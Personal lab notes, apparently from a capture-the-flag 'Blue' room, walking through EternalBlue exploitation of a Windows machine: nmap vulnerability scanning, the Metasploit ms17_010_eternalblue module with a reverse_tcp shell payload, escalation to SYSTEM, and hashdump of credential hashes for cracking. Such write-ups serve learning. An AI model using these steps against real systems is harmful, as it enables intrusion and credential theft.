# day 32 14th august 2025

# Blue

## recon

1. scan the network using `nmap -sV -O -A <target>` or `nmap -sV --script vuln <target machine>`
running nmap `--script vuln <target_IP>`  Checks for known CVEs. and in the end you will see what the machine is vuln to.
2. Scan will tell you about the os and you can try the most common vulnerabilities of that os or if you use -O -A this will give you what is missing in the os sometimes.

3. now that you know the problem you can search it. Let's take the most common one exploit/windows/smb/ms17_010_eternalblue . 
search `search ms smb`

## gain access

4. now that you know about the vuln use it.
5. set the required parameter and know them using `show options`
6. `set payload windows/x64/shell/reverse_tcp` no required
7. run
8. once in meterpreter background this shell ctrl+z.


## Escalate

9.  Once you background the shell use `sessions`.
10. then use `sessions -u <active target session no.>` if you manually loaded the payload.
11. use `getpid` to know your pid.
12. use `ps` to see all the pids.
13. if you are on low level authority shift to the system level.

## crack

14. Mostly we will work with meterpreter.
15. it is like using linux cmd.
16. want something search for it.
17. remember that you can only cd directories. And cat the files. Files will give you error on using cd.
18. `hashdump` for username and password hashes. Take those hash to online cracker or use jack if you have word list.


